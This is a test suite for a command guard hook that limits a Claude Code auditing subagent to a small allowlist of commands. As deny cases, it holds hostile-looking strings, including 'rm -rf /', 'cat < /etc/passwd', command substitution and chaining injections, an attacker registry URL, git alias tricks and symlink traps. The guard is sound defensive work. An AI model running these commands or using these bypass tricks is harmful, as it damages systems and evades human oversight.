// The command guard of the stacks-auditor subagent (hooks/stacks-auditor-guard.mjs). The guard is one layer,
// not a guarantee (it fails open when Node cannot start it), so these tests pin what it does when it runs:
// the hook is fed hook-input JSON on stdin and the exit code is asserted, as Claude Code would see it.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, readFileSync, symlinkSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { pathToFileURL } from "node:url";
import { HERE } from "./helpers.mjs";

const SKILL_DIR = join(HERE, "..");
const PLUGIN = join(SKILL_DIR, "..", "..");
const GUARD = join(PLUGIN, "hooks", "stacks-auditor-guard.mjs");
const { SHAPES, USER_SKILL_FOLDERS, decide } = await import(pathToFileURL(GUARD).href);

// The plugin's own engine: trusted. A fake home with one user-installed engine (.gemini) and stubs for the other cases.
const ENGINE = join(SKILL_DIR, "scripts", "stacks.mjs");
const tmp = (p) => mkdtempSync(join(tmpdir(), p));
const stubSkill = (dir, name = "azure-terraform-stacks-engine") => {
  mkdirSync(join(dir, "scripts"), { recursive: true });
  writeFileSync(join(dir, "scripts", "stacks.mjs"), "// stub engine for the guard tests\n");
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name }));
  return dir;
};
const HOME = tmp("ats-guard-home-");
const USER_SKILL = stubSkill(join(HOME, ".gemini", "skills", "azure-terraform-stacks"));
const USER_ENGINE = join(USER_SKILL, "scripts", "stacks.mjs");
const AUDITED = tmp("ats-guard-repo-"); // an audited repository with nothing in it
const sh = (p) => p.replaceAll("\\", "/");

// Runs the script as the hook does: JSON on stdin, exit code and stderr out. HOME is the fake home.
const hook = (command, { agent_type = "stacks-auditor", cwd = AUDITED, tool_name = "Bash", home = HOME } = {}) => {
  const input = { hook_event_name: "PreToolUse", tool_name, tool_input: { command }, ...(cwd === null ? {} : { cwd }), ...(agent_type === null ? {} : { agent_type }) };
  const r = spawnSync(process.execPath, [GUARD], { input: JSON.stringify(input), encoding: "utf8", env: { ...process.env, HOME: home, USERPROFILE: home } });
  return { code: r.status, stdout: r.stdout, stderr: r.stderr };
};
const allowed = (cmd, opts) => { const r = hook(cmd, opts); assert.equal(r.code, 0, `${cmd}: ${r.stderr}`); assert.equal(r.stderr, ""); };
const denied = (cmd, opts, reason) => {
  const r = hook(cmd, opts);
  assert.equal(r.code, 2, `${cmd} should be denied`);
  assert.match(r.stderr, /stacks-auditor guard: /);
  if (reason) assert.match(r.stderr, reason, cmd);
};

test("hooks.json registers one PreToolUse hook for Bash that runs the guard through the plugin variable", () => {
  const cfg = JSON.parse(readFileSync(join(PLUGIN, "hooks", "hooks.json"), "utf8"));
  const entries = cfg.hooks.PreToolUse;
  assert.equal(entries.length, 1);
  assert.equal(entries[0].matcher, "Bash");
  assert.deepEqual(entries[0].hooks.map((h) => h.type), ["command"]);
  assert.equal(entries[0].hooks[0].command, 'node "${CLAUDE_PLUGIN_ROOT}/hooks/stacks-auditor-guard.mjs"');
  assert.deepEqual(Object.keys(cfg.hooks), ["PreToolUse"]);
});

test("other agents are untouched: no agent_type, another agent, or another tool exit 0 and print nothing", () => {
  for (const cmd of ["terraform apply", "rm -rf /", "a; b"]) {
    for (const agent_type of [null, "general-purpose", "Stacks-Auditor", "stacks-auditor-2", ""]) {
      const r = hook(cmd, { agent_type });
      assert.equal(r.code, 0, `${cmd} for ${String(agent_type)}`);
      assert.equal(r.stdout + r.stderr, "");
    }
  }
  const other = hook("terraform apply", { tool_name: "Read" });
  assert.equal(other.code, 0);
  for (const bad of ["", "not json", "null", "[]"]) {
    const r = spawnSync(process.execPath, [GUARD], { input: bad, encoding: "utf8" });
    assert.equal(r.status, 0, `unparseable input "${bad}" cannot be scoped, so it is not touched`);
  }
});

test("allowed: the engine lookup, the checks and the audit with the plugin's engine or one installed in the user's folders", () => {
  allowed(`ls -d ${ENGINE} /repo/.claude/skills/azure-terraform-stacks/scripts/stacks.mjs ~/.copilot/skills/azure-terraform-stacks/scripts/stacks.mjs`);
  allowed("test -f /x/azure-terraform-stacks/scripts/stacks.mjs");
  allowed("test -d /x/azure-terraform-stacks/node_modules");
  allowed("node --version");
  allowed(`node ${ENGINE} audit`);
  allowed(`node ${ENGINE} audit --root ${AUDITED} --json`);
  allowed(`node ${ENGINE} audit --json --root ${AUDITED}`);
  allowed(`node "${ENGINE}" audit --root "${AUDITED}"`);
  allowed(`node ${USER_ENGINE} audit --json`);
  allowed("node ~/.gemini/skills/azure-terraform-stacks/scripts/stacks.mjs audit --root " + AUDITED);
});

// ---- Decision of the maintainer (2026-11-24): the engine runs only from the plugin or from the user's skills folders ----
test("the audited repository's own engine is never run: absolute, relative, ./, elsewhere, and under ~", () => {
  const repo = tmp("ats-guard-hostile-");
  const evil = tmp("ats-guard-evil-");
  const inRepo = stubSkill(join(repo, ".claude", "skills", "azure-terraform-stacks"));
  stubSkill(join(repo, "azure-terraform-stacks"));
  stubSkill(join(evil, "azure-terraform-stacks"));
  stubSkill(join(HOME, "x", "azure-terraform-stacks"));
  const cwd = { cwd: repo };
  const why = /inside the audited --root|inside the working directory|is not the engine of this plugin/;
  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit`, cwd, /inside the working directory/);
  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit --root ${repo} --json`, cwd, /inside the working directory/);
  denied("node .claude/skills/azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /inside the working directory/);
  denied("node ./.claude/skills/azure-terraform-stacks/scripts/stacks.mjs audit --json", cwd, /inside the working directory/);
  denied("node ./azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /inside the working directory/);
  denied("node azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /inside the working directory/);
  denied(`node ${join(evil, "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, cwd, /is not the engine of this plugin/);
  denied("node ~/x/azure-terraform-stacks/scripts/stacks.mjs audit", cwd, /is not the engine of this plugin/);
  // the same, from a working directory elsewhere: the project-scope folder is not an origin, and it is not trusted by being named like one
  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit --root ${repo}`, { cwd: AUDITED }, why);
  denied(`node ${join(inRepo, "scripts", "stacks.mjs")} audit`, { cwd: AUDITED }, /is not the engine of this plugin/);
});

test("engine path rules: a missing path, '..', an unknown working directory and a --root or cwd that contains the engine are denied", () => {
  denied("node ~/.copilot/skills/azure-terraform-stacks/scripts/stacks.mjs audit", {}, /does not exist or does not resolve/);
  denied(`node ${sh(USER_SKILL)}/../azure-terraform-stacks/scripts/stacks.mjs audit`, {}, /\.\./);
  denied(`node ${ENGINE} audit`, { cwd: null }, /working directory is unknown/);
  denied(`node ${ENGINE} audit`, { cwd: SKILL_DIR }, /inside the working directory/);
  denied(`node ${ENGINE} audit`, { cwd: PLUGIN }, /inside the working directory/);
  denied(`node ${ENGINE} audit --root ${PLUGIN}`, {}, /inside the audited --root/);
  denied(`node ${USER_ENGINE} audit --root ${HOME}`, {}, /inside the audited --root/);
  denied(`node ${USER_ENGINE} audit --root ${join(HOME, ".gemini")}`, {}, /inside the audited --root/);
  denied(`node ${USER_ENGINE} audit --root .gemini`, { cwd: HOME }, /inside/);
});

test("symbolic links are resolved: a link in the repository to a trusted engine is denied (as written, inside the repository), and a user folder that links into the audited repository is denied", (t) => {
  const repo = tmp("ats-guard-link-");
  const hostile = stubSkill(join(repo, "azure-terraform-stacks"));
  try {
    mkdirSync(join(repo, "bin"));
    symlinkSync(ENGINE, join(repo, "bin", "stacks.mjs"));
    mkdirSync(join(repo, "azure-terraform-stacks", "scripts"), { recursive: true });
    const trapHome = tmp("ats-guard-traphome-");
    mkdirSync(join(trapHome, ".cursor", "skills"), { recursive: true });
    symlinkSync(hostile, join(trapHome, ".cursor", "skills", "azure-terraform-stacks"), "dir");
    // a link inside the repository named like the engine, pointing at the plugin's engine
    mkdirSync(join(repo, "linked", "azure-terraform-stacks", "scripts"), { recursive: true });
    symlinkSync(ENGINE, join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs"));
    denied(`node ${join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, { cwd: repo }, /inside the working directory/);
    // the same link from another working directory: it resolves to the trusted engine, so it is allowed only when the path as written is outside the audited root
    allowed(`node ${join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, { cwd: AUDITED });
    denied(`node ${join(repo, "linked", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit --root ${repo}`, { cwd: AUDITED }, /inside the audited --root/);
    // The user's own link ~/.cursor/skills/azure-terraform-stacks -> a copy elsewhere is the user's choice and is trusted by its resolved path,
    // but not when that resolved path is inside the repository being audited (cwd or --root).
    const hostilePath = join(trapHome, ".cursor", "skills", "azure-terraform-stacks", "scripts", "stacks.mjs");
    allowed(`node ${hostilePath} audit`, { cwd: AUDITED, home: trapHome });
    denied(`node ${hostilePath} audit`, { cwd: repo, home: trapHome }, /inside the working directory/);
    denied(`node ${hostilePath} audit --root ${repo}`, { cwd: AUDITED, home: trapHome }, /inside the audited --root/);
    // a link whose target is not an engine folder of the list is not trusted
    const strayHome = tmp("ats-guard-strayhome-");
    mkdirSync(join(strayHome, ".agents", "skills"), { recursive: true });
    symlinkSync(AUDITED, join(strayHome, ".agents", "skills", "azure-terraform-stacks"), "dir");
    denied(`node ${join(strayHome, ".agents", "skills", "azure-terraform-stacks", "scripts", "stacks.mjs")} audit`, { cwd: AUDITED, home: strayHome }, /does not exist or does not resolve/);
  } catch (e) {
    if (e.code === "EPERM") return t.skip("cannot create a symbolic link here (EPERM, Windows)");
    throw e;
  }
});

test("chaining, pipes, redirects, substitution and newlines are denied before matching", () => {
  const e = `node ${ENGINE} audit`;
  for (const cmd of [
    `${e} && rm -rf x`, `${e} || rm -rf x`, `${e}; rm -rf x`, `${e} & rm -rf x`, `${e} | tee b`, "ls -d a | tee b",
    "echo hi > f", "echo hi >> f", "cat < /etc/passwd", `${e} > out.json`, `${e} 2>&1`,
    "ls -d $(whoami)", "ls -d `whoami`", "ls -d ${HOME}", "ls -d $HOME", "ls -d (a)", "ls -d {a,b}",
    `${e}\nrm -rf x`, `${e}\r\nrm -rf x`, `${e}\trm`.replace("\t", "\u000b"), "ls -d a\u0000b",
    "ls -d a\\ b", "ls -d *", "ls -d ?", "ls -d [a]", "ls -d a #b", "ls -d !x",
    "ls -d \"a;b\"", "ls -d 'a|b'", "ls -d \"$(id)\"", "ls -d '`id`'", "test -f \"a&b\"", `node "${ENGINE}" audit --root "a>b"`,
  ]) denied(cmd);
});

test("node: only the engine's audit; no inline code, no other subcommand, no other script, no extra options", () => {
  for (const cmd of [
    'node -e "1"', "node -e 1", "node -p 1", "node --eval 1", "node --input-type=module", "node -", "node",
    "node --version --help", "node --inspect", "node /tmp/x.mjs", "node ./stacks.mjs audit", "node stacks.mjs audit",
    `node ${ENGINE}`, `node ${ENGINE} scaffold`, `node ${ENGINE} add-stack`, `node ${ENGINE} bridge`, `node ${ENGINE} diagram`,
    `node ${ENGINE} check`, `node ${ENGINE} plan`, `node ${ENGINE} audit --force`, `node ${ENGINE} audit --root`, `node ${ENGINE} audit --root --json`,
    `node ${ENGINE} audit --json --json`, `node ${ENGINE} audit --root a --root b`, `node ${ENGINE} audit extra`, `node ${ENGINE} audit --root=/r`,
    `node /x/../azure-terraform-stacks/scripts/stacks.mjs audit`, `node /x/azure-terraform-stacks/scripts/stacks.mjs.evil audit`,
    `node --require /x/e.js ${ENGINE} audit`, `NODE_OPTIONS=--require=x node ${ENGINE} audit`, `/usr/bin/node ${ENGINE} audit`, `env node ${ENGINE} audit`,
  ]) denied(cmd);
});

test("ls and test: only -d and -f/-d with plain paths", () => {
  for (const cmd of ["ls", "ls -la", "ls -d", "ls -d -a x", "ls -l -d x", "ls /x", "test -e x", "test -f", "test -f a b", "test ! -f a", "test -f -x", "[ -f a ]", "cat /etc/passwd", "find . -delete", "echo hi"])
    denied(cmd);
});

test("the dependency install: only `npm ci --prefix <trusted skill folder> --omit=dev --ignore-scripts`, never in or from the audited repository", () => {
  const ok = (prefix) => `npm ci --prefix ${prefix} --omit=dev --ignore-scripts`;
  allowed(ok(SKILL_DIR));
  allowed(ok(USER_SKILL));
  allowed(ok("~/.gemini/skills/azure-terraform-stacks"));
  allowed(`npm ci --prefix "${SKILL_DIR}" --omit=dev --ignore-scripts`);
  // the old form (npm in the working directory) is gone, even from a trusted folder
  for (const cwd of [AUDITED, SKILL_DIR, undefined]) denied("npm ci --omit=dev --ignore-scripts", { cwd }, /only `npm ci --prefix/);
  // a prefix inside the audited repository, a look-alike elsewhere, a trusted-looking name that is not an engine
  const repo = tmp("ats-guard-npm-repo-");
  const inRepo = stubSkill(join(repo, "azure-terraform-stacks"));
  const elsewhere = stubSkill(join(tmp("ats-guard-npm-else-"), "azure-terraform-stacks"));
  const notEngine = stubSkill(join(HOME, ".cursor", "skills", "azure-terraform-stacks"), "someone-elses-package");
  denied(ok(inRepo), { cwd: repo }, /inside the working directory/);
  denied(ok("azure-terraform-stacks"), { cwd: repo }, /inside the working directory/);
  denied(ok("."), { cwd: repo }, /inside the working directory/);
  denied(ok(inRepo), { cwd: AUDITED }, /not the engine of this plugin/);
  denied(ok(elsewhere), {}, /not the engine of this plugin/);
  denied(ok(repo), {}, /not the engine of this plugin/);
  denied(ok(PLUGIN), {}, /not the engine of this plugin/);
  denied(ok(join(HOME, ".gemini")), {}, /not the engine of this plugin/);
  denied(ok(notEngine), {}, /not the engine's skill folder/);
  denied(ok(`${sh(USER_SKILL)}/../azure-terraform-stacks`), {}, /"\.\." segment/);
  denied(ok("~/.copilot/skills/azure-terraform-stacks"), {}, /does not exist or does not resolve/);
  denied(ok(SKILL_DIR), { cwd: SKILL_DIR }, /inside the working directory/);
  denied(ok(SKILL_DIR), { cwd: null }, /working directory is unknown/);
  // every other flag or argument, and any other order
  for (const bad of [
    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts=false`, `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --foreground-scripts`,
    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --userconfig ${HOME}/x`, `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --globalconfig ${HOME}/x`,
    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --registry http://evil.example`, `npm ci --registry http://evil.example --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`,
    `npm ci --prefix ${SKILL_DIR} --omit=dev`, `npm ci --prefix ${SKILL_DIR} --ignore-scripts`, `npm ci --omit=dev --ignore-scripts --prefix ${SKILL_DIR}`,
    `npm ci --prefix=${SKILL_DIR} --omit=dev --ignore-scripts`, `npm ci --prefix ${SKILL_DIR} --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`,
    `npm ci --prefix --omit=dev --omit=dev --ignore-scripts`, `npm install --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`, `npm run test --prefix ${SKILL_DIR}`,
    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts && ls`, "npx yaml", "npm ci", "npm install",
  ]) denied(bad, {}, /only `npm ci --prefix|metacharacters|not on the allowlist/);
});

// Task 2.4: with a clean filter configured in the audited repository, `git -c core.fsmonitor=false status --porcelain`
// still ran the filter's program (fsmonitor off was not enough), so no git command is allowed at all.
test("git: nothing, because git runs programs named in the audited repository's own configuration", () => {
  for (const cmd of ["git status", "git status --porcelain", "git -c core.fsmonitor=false status --porcelain", "git -c core.fsmonitor=false status --porcelain --ignored",
    "git log", "git diff", "git push", "git commit -m x", "git -c alias.x=!rm status", "git --no-pager status --porcelain", "git -C /r status --porcelain"])
    denied(cmd);
});

test("commands the spec names are denied: terraform, kubectl, az, gh, git push", () => {
  for (const cmd of ["terraform plan", "terraform --version", "kubectl get pods", "az login", "gh pr create", "git push", "rm -rf x", "mv a b", "cp a b", "tee f", "sed -i s/a/b/ f", "python3 -c 1", "bash -c ls", "sh script.sh", "curl http://x", "xargs rm", "sudo ls"])
    denied(cmd);
});

test("an empty or non-string command is denied for the auditor, and a guard error blocks", () => {
  denied("");
  denied("   ");
  for (const c of [undefined, null, 5, {}, []]) assert.equal(decide(c).allow, false);
  const r = spawnSync(process.execPath, [GUARD], { input: JSON.stringify({ agent_type: "stacks-auditor", tool_name: "Bash", tool_input: {} }), encoding: "utf8" });
  assert.equal(r.status, 2);
});

test("the deny message tells the agent to stop and not to look for another way", () => {
  assert.match(hook("terraform plan").stderr, /report it to the user and stop|Report it to the user and stop/);
});

// ---- the shapes the agent is told about are the shapes the guard allows ----
const AGENT = readFileSync(join(PLUGIN, "agents", "stacks-auditor.md"), "utf8").replace(/^\uFEFF/, "").replace(/\r\n?/g, "\n"); // CRLF checkouts on Windows

test("the allowed shapes listed in the agent's instructions equal the guard's SHAPES", () => {
  const section = /## Commands you may run[\s\S]*?```text\n([\s\S]*?)```/.exec(AGENT);
  assert.ok(section, "the agent has a 'Commands you may run' block");
  assert.deepEqual(section[1].trim().split("\n").map((l) => l.trim()), SHAPES);
});

test("every shape in SHAPES has a concrete command that the guard allows (so the list cannot drift from the code)", () => {
  const samples = {
    "ls -d <path>...": "ls -d /a /b",
    "test -f <path>": "test -f /a",
    "test -d <path>": "test -d /a",
    "node --version": "node --version",
    "node <engine> audit [--root <path>] [--json]": `node ${ENGINE} audit --root ${AUDITED} --json`,
    "npm ci --prefix <skill folder> --omit=dev --ignore-scripts": `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`,
  };
  assert.deepEqual(Object.keys(samples), SHAPES);
  for (const s of SHAPES) assert.equal(decide(samples[s], { cwd: AUDITED, home: HOME }).allow, true, s);
});

test("the agent's ls -d line lists the plugin path then the user folders of the guard, which equal the user folders of src/lib/tools.mjs", async () => {
  const line = AGENT.split("\n").map((l) => l.trim()).find((l) => l.startsWith("ls -d ${CLAUDE_PLUGIN_ROOT}"));
  const paths = line.slice("ls -d ".length).split(/\s+/);
  const tail = "azure-terraform-stacks/scripts/stacks.mjs";
  assert.deepEqual(paths.slice(1), USER_SKILL_FOLDERS.map((f) => `~/${f}/${tail}`));
  const { TOOLS } = await import(pathToFileURL(join(PLUGIN, "..", "..", "src", "lib", "tools.mjs")).href);
  assert.deepEqual(USER_SKILL_FOLDERS, [...new Set(Object.values(TOOLS).map((t) => t.user))]);
  assert.ok(!line.includes("<repo>"), "no project-scope folder in the agent's lookup line");
});

test("the guard's own file is not a way around: it is read-only code with no dependency", () => {
  const src = readFileSync(GUARD, "utf8");
  assert.ok(!/from "(?!node:)/.test(src), "imports only node: modules");
  assert.ok(existsSync(join(PLUGIN, "hooks", "hooks.json")));
});

test("--ignore-scripts costs nothing: no package in the engine's lockfile has an install script", () => {
  const lock = JSON.parse(readFileSync(join(SKILL_DIR, "package-lock.json"), "utf8"));
  const withScripts = Object.entries(lock.packages).filter(([, p]) => p.hasInstallScript).map(([n]) => n);
  assert.deepEqual(withScripts, []);
});
